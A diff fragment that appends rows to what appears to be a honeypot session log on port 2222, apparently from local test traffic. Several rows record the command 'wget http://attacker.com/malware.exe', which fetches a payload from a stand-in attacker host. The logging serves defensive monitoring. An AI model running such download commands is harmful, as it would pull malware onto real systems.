@@ -27,3 +27,8 @@ S-1768932878,127.0.0.1,51072,2026-01-20 23:44:38,Connection events only,2222,def
 S-1768932879,127.0.0.1,51073,2026-01-20 23:44:39,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
 S-1768933303,127.0.0.1,58044,2026-01-20 23:51:44,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
 S-1768933348,127.0.0.1,60691,2026-01-20 23:52:29,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1769709063,127.0.0.1,58397,2026-01-29 23:21:04,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1770355901,127.0.0.1,55771,2026-02-06 11:01:41,Connection events only,2222,default,unknown,LOCAL
+S-1770355902,127.0.0.1,55775,2026-02-06 11:01:42,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1770537908,127.0.0.1,51134,2026-02-08 13:35:08,Connection events only,2222,default,unknown,LOCAL
+S-1770537909,127.0.0.1,51135,2026-02-08 13:35:10,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
